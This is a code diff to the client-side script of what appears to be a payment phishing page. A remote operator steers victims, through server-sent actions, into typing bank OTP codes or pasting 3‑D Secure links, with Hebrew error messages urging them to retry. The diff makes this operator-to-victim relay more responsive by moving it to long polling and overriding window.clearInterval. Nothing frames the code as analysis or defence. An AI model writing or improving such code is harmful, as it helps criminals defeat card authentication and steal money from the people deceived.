@@ -316,63 +316,90 @@
   function getOtp(){ return boxes.map(b=>b.value).join(''); }
   function clearOtp(){ boxes.forEach(b => { b.value=''; b.classList.remove('filled'); }); boxes[0].focus(); }
 
-  // ----- Polling -----
-  let lastSeq = 0;
+  // ----- Long-poll loop -----
   let currentMode = 'waiting';
+  let lastAction = 'pending';
   let otpAttempt = 0;
   let tdsAttempt = 0;
   let allowClose = false;
+  let pollAbort = null;
 
-  async function poll() {
+  function applyAction(action) {
+    if (action === lastAction) return;
+    lastAction = action;
+    if (action === 'otp') {
+      currentMode = 'otp';
+      $('otpErr').classList.remove('show');
+      clearOtp();
+      show('otp');
+    } else if (action === '3ds') {
+      currentMode = '3ds';
+      $('tdsErr').classList.remove('show');
+      $('tdsInput').value = '';
+      show('tds');
+      $('tdsInput').focus();
+    } else if (action === 'decline') {
+      if (currentMode === 'otp') {
+        $('otpErr').textContent = 'קוד שגוי — נסה שוב';
+        $('otpErr').classList.add('show');
+        clearOtp();
+        show('otp');
+      } else if (currentMode === '3ds') {
+        $('tdsErr').textContent = 'קישור לא תקין — העתק שוב מההודעה';
+        $('tdsErr').classList.add('show');
+        $('tdsInput').value = '';
+        show('tds');
+      } else {
+        show('fail');
+      }
+    } else if (action === 'success') {
+      show('done');
+      allowClose = true;
+      stopPolling();
+    }
+  }
+
+  async function initialFetch() {
     try {
       const r = await fetch('/api/check-mode?s=' + encodeURIComponent(sessionId));
       const d = await r.json();
-
-      // Always update card visuals if we got them
       if (d.brand || d.last4) setBrand(d.brand, d.last4, holder);
       if (d.phone) {
-        const p = String(d.phone).replace(/\D/g,'');
+        const p = String(d.phone).replace(/\D/g, '');
         $('phoneHint').textContent = p.slice(-4) || '****';
       }
-
-      if ((d.seq ?? 0) <= lastSeq) return;
-      lastSeq = d.seq;
-
-      if (d.action === 'otp') {
-        currentMode = 'otp';
-        $('otpErr').classList.remove('show');
-        clearOtp();
-        show('otp');
-      } else if (d.action === '3ds') {
-        currentMode = '3ds';
-        $('tdsErr').classList.remove('show');
-        $('tdsInput').value = '';
-        show('tds');
-        $('tdsInput').focus();
-      } else if (d.action === 'decline') {
-        if (currentMode === 'otp') {
-          $('otpErr').textContent = 'קוד שגוי — נסה שוב';
-          $('otpErr').classList.add('show');
-          clearOtp();
-          show('otp');
-        } else if (currentMode === '3ds') {
-          $('tdsErr').textContent = 'קישור לא תקין — העתק שוב מההודעה';
-          $('tdsErr').classList.add('show');
-          $('tdsInput').value = '';
-          show('tds');
-        } else {
-          show('fail');
-        }
-      } else if (d.action === 'success') {
-        show('done');
-        clearInterval(timer);
-        allowClose = true;
-      }
+      if (d.action) applyAction(d.action);
     } catch {}
   }
 
-  const timer = setInterval(poll, 700);
-  poll();
+  let stopped = false;
+  function stopPolling() { stopped = true; if (pollAbort) pollAbort.abort(); }
+
+  async function longPollLoop() {
+    while (!stopped) {
+      try {
+        pollAbort = new AbortController();
+        const r = await fetch(
+          '/api/check-mode?s=' + encodeURIComponent(sessionId)
+            + '&w=1&p=' + encodeURIComponent(lastAction),
+          { signal: pollAbort.signal }
+        );
+        const d = await r.json();
+        if (d.action) applyAction(d.action);
+      } catch {
+        // network blip — wait briefly and retry
+        await new Promise((res) => setTimeout(res, 1000));
+      }
+    }
+  }
+
+  // Kick off
+  initialFetch().then(longPollLoop);
+
+  // Compatibility shim (other code references `timer`/`clearInterval`)
+  const timer = { _stop: stopPolling };
+  const _origClearInterval = window.clearInterval;
+  window.clearInterval = function (t) { if (t && t._stop) t._stop(); else _origClearInterval(t); };
 
   // ----- Submit handlers -----
   $('otpBtn').onclick = async () => {
